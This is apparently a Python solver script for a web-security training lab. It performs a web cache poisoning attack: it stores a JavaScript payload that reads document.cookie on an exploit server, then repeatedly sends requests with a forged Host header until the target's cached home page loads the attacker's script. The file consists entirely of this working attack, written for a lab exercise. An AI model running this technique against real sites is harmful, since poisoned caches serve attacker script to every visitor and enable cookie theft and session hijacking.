import requests
import re
import http.client
import time
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.exploit_server_url = None

    def get_csrf_token(self, endpoint):
        response = self.session.get(self.lab_url + endpoint)
        return re.search('name="csrf" value="(.*)"', response.text).group(1)

    def get_exploit_server_url(self):
        response = self.session.get(self.lab_url)
        self.exploit_server_url = re.search(r'href=\'(https://exploit-.*?)\'', response.text).group(1)

    def upload_payload(self):
        data = {
            'urlIsHttps': 'on',
            'responseFile': '/resources/js/tracking.js',
            'responseHead': 'HTTP/1.1 200 OK\r\nContent-Type: application/javascript; charset=utf-8',
            'responseBody': 'alert(document.cookie)',
            'formAction': 'STORE'
        }
        self.session.post(self.exploit_server_url, data=data)

    def poison_cache(self):
        response = self.session.get(self.lab_url)
        cookie = response.request.headers.get('Cookie')

        while True:
            conn = http.client.HTTPSConnection(host=self.lab_url.replace('https://', '').rstrip('/'))

            headers = [
                ('Host', self.exploit_server_url.replace('https://', '')),
                ('Cookie', cookie)
            ]

            conn.putrequest('GET', '/')
            for header in headers:
                conn.putheader(header[0], header[1])
            conn.endheaders()

            response = conn.getresponse()
            if self.exploit_server_url.replace('https://', '') + '/resources/js/tracking.js' in response.read().decode():
                break

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.get_exploit_server_url()
        self.upload_payload()
        self.poison_cache()
        time.sleep(30)
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
